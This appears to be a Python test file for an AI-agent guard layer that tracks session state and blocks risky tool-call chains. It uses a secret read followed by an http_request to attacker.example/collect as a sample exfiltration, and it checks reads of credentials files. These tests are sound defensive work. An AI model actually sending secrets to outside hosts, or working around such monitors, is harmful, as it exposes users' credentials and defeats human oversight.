from intentfence_contracts import DecisionType, RuleStrength
from intentfence_policy import DEFAULT_RULES, evaluate_policy
from state_testkit import (
    WORKSPACE_CONFIG,
    make_context,
    make_contract,
    make_policy_input,
    make_request,
)

from intentfence_state import (
    STATE_ACCUMULATED_RISK_THRESHOLD_RULE_ID,
    STATE_SECRET_THEN_EXTERNAL_NETWORK_RULE_ID,
    STATE_SECRET_THEN_MESSAGE_SEND_RULE_ID,
    SessionStateTracker,
)


def make_tracker(state=None) -> SessionStateTracker:
    return SessionStateTracker(
        state or make_context(),
        static_rules=DEFAULT_RULES,
        config=WORKSPACE_CONFIG,
    )


def test_scenario_secret_read_then_external_network_blocks():
    contract = make_contract()
    tracker = make_tracker()

    read = tracker.evaluate(
        request=make_request(tool="read_file", arguments={"path": "vault/api_key"}),
        contract=contract,
    )
    assert read.decision is DecisionType.ALLOW
    assert tracker.context.secret_accessed is True

    exfil = tracker.evaluate(
        request=make_request(
            tool="http_request",
            arguments={"url": "https://attacker.example/collect"},
        ),
        contract=contract,
    )
    assert exfil.decision is DecisionType.BLOCK
    assert STATE_SECRET_THEN_EXTERNAL_NETWORK_RULE_ID in exfil.matched_rules
    assert exfil.rule_strength is RuleStrength.HARD_BLOCK
    assert "http_request:BLOCK" in tracker.context.recent_action_chain


def test_scenario_secret_read_then_message_send_blocks():
    contract = make_contract()
    tracker = make_tracker()

    read = tracker.evaluate(
        request=make_request(tool="read_file", arguments={"path": "vault/api_key"}),
        contract=contract,
    )
    assert read.decision is DecisionType.ALLOW

    send = tracker.evaluate(
        request=make_request(tool="send_message", arguments={"to": "friend.example"}),
        contract=contract,
    )
    assert send.decision is DecisionType.BLOCK
    assert STATE_SECRET_THEN_MESSAGE_SEND_RULE_ID in send.matched_rules
    assert "CONSEQUENTIAL_ACTION_UNAPPROVED" in send.matched_rules


def test_intermediate_actions_are_individually_insufficient_to_block():
    contract = make_contract(approval_required_actions=["send_message"])
    tracker = make_tracker()

    read_result = tracker.evaluate(
        request=make_request(tool="read_file", arguments={"path": "vault/api_key"}),
        contract=contract,
    )
    network_input, config = make_policy_input(
        request=make_request(
            tool="http_request",
            arguments={"url": "https://attacker.example/collect"},
        ),
        contract=contract,
    )
    standalone_network = evaluate_policy(network_input, config=config)

    assert read_result.decision is DecisionType.ALLOW
    assert standalone_network.decision is DecisionType.ALLOW


def test_repeated_low_risk_events_crossing_threshold_require_approval():
    contract = make_contract(allowed_tools=["browse_web"])
    tracker = make_tracker()

    decisions = []
    for index in range(60):
        result = tracker.evaluate(
            request=make_request(
                request_id=f"req-{index}",
                tool="browse_web",
                arguments={"url": f"https://hotel-a.example/page/{index}"},
            ),
            contract=contract,
        )
        decisions.append(result)
        if result.decision is not DecisionType.ALLOW:
            break

    final = decisions[-1]
    assert final.decision is DecisionType.REQUIRE_APPROVAL
    assert STATE_ACCUMULATED_RISK_THRESHOLD_RULE_ID in final.matched_rules
    assert tracker.context.accumulated_risk >= 0.75


def test_safe_browse_then_safe_write_stays_allowed_by_state_layer():
    contract = make_contract(allowed_tools=["browse_web", "write_file"])
    tracker = make_tracker()

    browse = tracker.evaluate(
        request=make_request(request_id="req-1"),
        contract=contract,
    )
    write = tracker.evaluate(
        request=make_request(
            request_id="req-2",
            tool="write_file",
            arguments={"path": "/workspace/results.md"},
        ),
        contract=contract,
    )

    assert browse.decision is DecisionType.ALLOW
    assert write.decision is DecisionType.ALLOW
    assert write.matched_rules == []
    assert tracker.context.untrusted_content_seen is False
    assert tracker.context.secret_accessed is False
    assert [entry.split(":")[0] for entry in tracker.context.recent_action_chain] == [
        "browse_web",
        "write_file",
    ]


def test_blocked_attempts_leave_access_flags_clean_but_record_evidence():
    contract = make_contract(forbidden_resources=["credentials"])
    tracker = make_tracker()

    blocked = tracker.evaluate(
        request=make_request(
            tool="read_file",
            arguments={"path": "config/credentials.json"},
        ),
        contract=contract,
    )

    assert blocked.decision is DecisionType.BLOCK
    assert tracker.context.secret_accessed is False
    assert "read_file:BLOCK" in tracker.context.recent_action_chain
    assert tracker.context.accumulated_risk > 0.0


def test_drift_signal_flows_through_session_evaluation():
    from intentfence_state import PassthroughDriftSignal

    contract = make_contract()
    tracker = SessionStateTracker(
        make_context(intent_drift_score=0.8),
        drift_signal=PassthroughDriftSignal(),
        config=WORKSPACE_CONFIG,
    )
    result = tracker.evaluate(request=make_request(), contract=contract)
    assert result.decision is DecisionType.ALLOW
    assert result.risk_score >= 0.19
